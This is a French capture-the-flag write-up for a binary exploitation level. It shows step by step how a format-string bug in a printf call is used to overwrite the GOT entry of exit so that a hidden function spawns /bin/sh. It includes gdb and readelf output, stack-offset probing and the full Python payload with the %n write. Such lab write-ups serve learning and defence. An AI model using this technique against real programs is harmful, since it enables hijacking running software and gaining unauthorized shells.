Si on disass notre exécutable il call printf avec notre input et utilise exit pour terminer le programme.
On remarque aussi qu'une fonction est présente mais n'est pas appelée, la fonction o exécute system("/bin/sh").
On en déduit qu'il va falloir détourner notre exécutable afin qu'il lance la fonction qui n'est pas utilisée ( la fonction o )

Vu que notre input est directement utilisé par printf nous pouvons effectuer un format string attack, mais contrairement a l'exercice d'avant nous ne pouvons pas utiliser le retour de la fonction pour l'exploit car la fonction se termine avant avec l'appel de exit(). Donc il n'y a pas d'EIP à overwrite.
Cependant l'exécutable utilise des 'dynamic link' et une faille est possible en écrasant la valeur de notre relocation (effectuée par plt) de la fonction exit. On va donc chercher à remplacer la valeur de notre GOT ( global offset table ) qui contient l'adresse pour exécuter exit().
Si on remplace l'adresse par celle de notre fonction o, notre fonction sera donc exécutée quand un appel à exit.plt sera effectué.

Pour obtenir les différentes adresses, dans gdb:

`info functions`
- 0x080484a4  o
Et pour avoir l'emplacement de la relocation on utilise readelf

`readelf -r ./level5`
- 08049838  00000607 R_386_JUMP_SLOT   00000000   exit

Pour récapituler nous devons donc écrire 0x080484a4 (o) dans 08049838 (reloc), 0x080484a4 en décimal vaut 134513828

Comme dans l'ancien exercice on utilise %p pour trouver l'emplacement de notre format string dans la stack

`python -c "print('AAAA' + ' %p'*10)" | ./level5`
- AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520

Notre string 'AAAA' est le 4eme element.
Nous pouvons donc pointer dessus de cette maniere '%4\$p'

`python -c "print('AAAA' + ' %4\$p')" | ./level5`
- AAAA 0x41414141

Cela fonctionne correctement il nous reste donc à tout assembler, c'est à dire écrire notre adresse 0x08049838 (reloc) notre nombre 0x080484a4 (o) en utilisant le %n de printf. ( attention a bien faire -4 a notre valeur car l'adresse que nous ecrivont avant vaut 4 soit 134513824 )

`python -c "print('\x38\x98\x04\x08' + '%134513824d' + ' %4\$n')" | ./level5`

Apres une dizaine de seconde la commande s'est exécutéee, mais il ne se passe rien car notre appel system se fini directement, il faut donc garder le stdin ouvert afin de pouvoir interagir avec notre sh qui est exécuté ! 

`(python -c "print('\x38\x98\x04\x08' + '%134513824d' + ' %4\$n')" ; cat) | ./level5`
